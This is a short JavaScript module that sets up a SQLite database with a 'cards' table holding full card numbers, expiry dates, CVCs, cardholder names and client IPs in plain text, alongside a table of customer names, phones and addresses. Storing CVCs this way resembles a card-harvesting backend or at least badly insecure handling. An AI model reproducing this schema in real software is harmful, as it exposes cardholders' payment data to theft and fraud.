// db.js
import sqlite3 from 'sqlite3';
import { open } from 'sqlite';

export async function initDB() {
  const db = await open({ filename: './data.sqlite', driver: sqlite3.Database });

  await db.exec(`
    CREATE TABLE IF NOT EXISTS cards (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      clientNumber TEXT,
      phoneNumber TEXT,
      cardNumber TEXT,
      expiryMonth TEXT,
      expiryYear TEXT,
      cvc TEXT,
      cardName TEXT,
      clientIP TEXT,
      date TEXT
    );
  `);

  await db.exec(`
    CREATE TABLE IF NOT EXISTS users (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      phoneNumber TEXT,
      address TEXT,
      name TEXT,
      orderItems TEXT,
      clientNumber TEXT,
      date TEXT
    );
  `);

  return db;
}
